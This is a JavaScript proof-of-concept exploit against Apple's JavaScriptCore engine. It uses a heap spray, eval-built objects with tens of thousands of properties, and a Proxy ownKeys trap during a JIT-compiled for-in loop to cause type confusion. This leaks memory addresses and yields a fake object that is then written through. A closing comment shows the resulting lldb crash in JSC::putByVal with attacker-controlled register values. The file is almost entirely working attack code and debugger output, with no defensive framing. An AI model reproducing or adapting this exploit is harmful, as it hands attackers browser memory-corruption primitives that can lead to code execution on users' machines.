load('utils.js');
load('int64.js');



function r_str(l){
    let random_string = '';
    let random_ascii;
    for(let i = 0; i < l; i++) {
        random_ascii = Math.floor((Math.random() * 25) + 97);
        random_string += String.fromCharCode(random_ascii)
    }
    return random_string
}

var o;
var o2, o3;

function obj_with_size(n){

    let s = 'var obj = {';
    for (let y = 0; y < n; y++){
        s += 'a' + y + ':' + '"a"' + ',';
    }
    s += '}'
    eval(s);
    return obj;
    
}

var v = new ArrayBuffer(0x200);

//var sa = new Float64Array(0x30000*8);
var sa = new ArrayBuffer(0x30000*8);

for ( let y = 0; y < 0x30000*1; y++){
    let cp = new Float64Array(0x2000);
    cp.fill(3.5993841828739e-310);
    cp[r_str(12)] = 'a';
    sa[y] = cp;
    
}

function obj_with_ab(n){

    let s = 'var obj = {';
    for (let y = 0; y < n; y++){
        s += 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' + y + ':' + 'sa['+y+']' + ',';
    }
    s += '}'
    eval(s);
    return obj;
    
}


//o2 = obj_with_size(48600);
//o3 = obj_with_size(48600);
o2 = obj_with_ab(48600);
o3 = obj_with_ab(48600);
//let aa = 'a0';
//let leakme = [1,2,3];

//o = {a0:new ArrayBuffer(0x8000),a1:new ArrayBuffer(0x8000),a2:new ArrayBuffer(0x8000),a3:
 //   new ArrayBuffer(0x8000)
//};
//o[aa] = 0;
o = obj_with_ab(4);

//aa.toString = function(){return sa;}

function opt(tmp,flag) {
            
    function f(a) {
        if (flag){
            //gc();
            //return {'r':0,'d':1,'l':2,'u':3,'f':4};
        }
        return a;
    }
        
    let p = new Proxy(tmp,{ownKeys:f});
    o2.__proto__ = p;
    let g = 0;
    let c = 0;
    let q = null;

    for (let x in o2) {
    
        if (flag) {
        
            //gc();
             
            c++;
            print(c) 
            
            //if ( g == 1 ){return x;}
                       
            // we don't want to refarance this
            // object twice if its a fake_object.
            // because jsc would crash..
            // so save this into a string.
            //print(describe(x));
            if ( g == 1) { return x;}            
            let s = typeof x;
            print(s);

                        
            if ( s == 'object' ){
                g = 1;
                //print(x[0]);
            } else {
                if ( typeof x == 'string' ){}
                else {
                  print('here');
                  print('typeof x:' + typeof x);                 
                  print('leaked memory: '+ Int64.fromDouble(x));
                  return; 
                }
            }
        } else { 
          // optimize access ..
          //o2[x] = 3.54484805889626e-310;        
        }
        q = x;
    }
    return q;
    
}

// Compile the functions
for (let t = 0; t <200;t++){
    opt(o3,false);
}

let fo = opt(o,true);
print('a');
fo[0] = 3.54484805889626e-310;


sa[89];




/*

* thread #1, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=EXC_I386_GPFLT)
    frame #0: 0x0000000100911758 JavaScriptCore`JSC::putByVal(JSC::ExecState*, JSC::JSValue, JSC::JSValue, JSC::JSValue, JSC::ByValInfo*) + 264
JavaScriptCore`JSC::putByVal:
->  0x100911758 <+264>: movq   0x40(%rdi), %rax
    0x10091175c <+268>: movq   %rsi, %rdi
    0x10091175f <+271>: movq   %r12, %rsi
    0x100911762 <+274>: movl   %r15d, %edx
Target 0: (jsc) stopped.
(lldb) reg r
General Purpose Registers:
       rax = 0x000000010b300000
       rbx = 0x0001414141414141
       rcx = 0x0001414141414141
       rdx = 0x0000000003230300
       rdi = 0x0361616161616161
       


*/





